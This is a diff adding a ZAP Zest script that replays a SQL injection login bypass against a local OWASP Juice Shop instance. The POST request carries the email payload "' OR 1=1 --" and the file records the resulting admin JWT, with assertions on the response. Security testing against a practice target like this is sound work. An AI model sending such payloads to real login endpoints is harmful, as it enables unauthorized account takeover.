@@ -1,0 +1,60 @@
+{
+  "about": "This is a Zest script. For more details about Zest visit https://github.com/zaproxy/zest/",
+  "zestVersion": "0.8",
+  "title": "sql_injection_login_2",
+  "description": "",
+  "prefix": "http://localhost:3000/rest/user",
+  "type": "StandAlone",
+  "parameters": {
+    "tokenStart": "{{",
+    "tokenEnd": "}}",
+    "tokens": {},
+    "elementType": "ZestVariables"
+  },
+  "statements": [
+    {
+      "url": "http://localhost:3000/rest/user/login",
+      "data": "{\"email\":\"\u0027 OR 1\u003d1 --\",\"password\":\"asdasd\"}",
+      "method": "POST",
+      "headers": "Content-Type: application/json\r\ncontent-length: 43\r\nOrigin: http://localhost:3000\r\nPriority: u\u003d0\r\n",
+      "response": {
+        "url": "http://localhost:3000/rest/user/login",
+        "headers": "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nX-Content-Type-Options: nosniff\r\nX-Frame-Options: SAMEORIGIN\r\nFeature-Policy: payment \u0027self\u0027\r\nX-Recruiting: /#/jobs\r\nContent-Type: application/json; charset\u003dutf-8\r\nContent-Length: 811\r\nETag: W/\"32b-AsIO5PvtpV0blKrvWauV5QoI3iI\"\r\nVary: Accept-Encoding\r\nDate: Thu, 06 Feb 2025 22:56:29 GMT\r\nConnection: keep-alive\r\nKeep-Alive: timeout\u003d5\r\n\r\n",
+        "body": "{\"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIxMjcuMC4wLjEiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDItMDUgMTU6NTQ6MDMuNjIwICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDItMDUgMTg6NDI6MzEuODM0ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTczODg4MjU4OX0.uGM8gKaQuAb0r1W1m8HZq9tXblKN2OQzu7NGVTbiE-TWqPFwJTuoEuGoC78-gx0dND4CSH8cmtaDfXqGIziURJoWKRItWZRYAAZw1A3LalA9l0-cLDsWuknpgKQg4RAfxM0dmtJIKIzVw8NDGD13StShC7n96nbnS1Nk-NF73vM\",\"bid\":1,\"umail\":\"admin@juice-sh.op\"}}",
+        "statusCode": 200,
+        "responseTimeInMs": 53,
+        "elementType": "ZestResponse"
+      },
+      "assertions": [
+        {
+          "rootExpression": {
+            "code": 200,
+            "not": false,
+            "elementType": "ZestExpressionStatusCode"
+          },
+          "elementType": "ZestAssertion"
+        },
+        {
+          "rootExpression": {
+            "length": 811,
+            "approx": 1,
+            "variableName": "response.body",
+            "not": false,
+            "elementType": "ZestExpressionLength"
+          },
+          "elementType": "ZestAssertion"
+        }
+      ],
+      "followRedirects": false,
+      "timestamp": 1738882589448,
+      "cookies": [],
+      "index": 1,
+      "enabled": true,
+      "elementType": "ZestRequest"
+    }
+  ],
+  "authentication": [],
+  "index": 0,
+  "enabled": true,
+  "elementType": "ZestScript"
+}
